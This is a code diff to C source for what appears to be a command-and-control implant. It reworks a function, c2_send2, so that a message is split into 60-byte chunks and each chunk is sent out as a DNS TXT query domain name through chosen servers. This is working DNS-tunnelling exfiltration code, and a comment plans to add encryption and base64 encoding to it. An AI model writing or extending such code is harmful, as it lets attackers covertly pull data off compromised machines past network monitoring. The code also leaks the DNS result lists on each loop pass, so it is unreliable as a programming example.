@@ -474,25 +474,40 @@ int c2_send(char* data, int len) {
 
 // TODO: needs lots of clean up
 // TODO: need to rename this too
+// TODO: encrypt and base64 encode
+// Note: looks like name can be ~60 bytes (found from testing)
 int c2_send2(char* msg, int len) {
     DNS_STATUS status;
     DNS_QUERY_REQUEST request  = {0};
     PDNS_RECORD result         = NULL;
 
-    status = DnsQuery_A("testtesttesttesttesttesttesttesttestte.com", DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
-    if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
-        c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
-        return 0;
+    int num_sent = 0;
+    char buffer[128] = {0};
+    while (num_sent < len) {
+        // Copy chunk of message to buffer which we'll use as domain name to query
+        int bytes_left = len - num_sent;
+        int amount_to_copy = (bytes_left < 60) ? bytes_left : 60;
+        memset(buffer, 0, 128);
+        strncpy(buffer, msg + num_sent, amount_to_copy);
+        strcat(buffer, ".com"); // domain names need a top-level domain
+
+        // Send query
+        status = DnsQuery_A(buffer, DNS_TYPE_TEXT, DNS_QUERY_BYPASS_CACHE | DNS_QUERY_USE_TCP_ONLY, pSrvList, &result, NULL);
+        if (status != ERROR_SUCCESS && status != DNS_INFO_NO_RECORDS) {
+            c2_log("[!] c2_send2:DnsQuery_A failed with status %d\n", status);
+            return 0;
+        }
+
+        // Get response
+        DNS_RECORD record = result[0];
+        c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
+        
+        num_sent += amount_to_copy;
     }
 
-    // TODO actually process result
-    DNS_RECORD record = result[0];
-    c2_log("Name: %s\nData: %s\n", record.pName, record.Data.TXT.pStringArray[0]);
     c2_log("[+] DNS query success");
-
     DnsRecordListFree(result, DnsFreeRecordList);
-    return 1;
-
+    return num_sent;
 }
 
 #endif
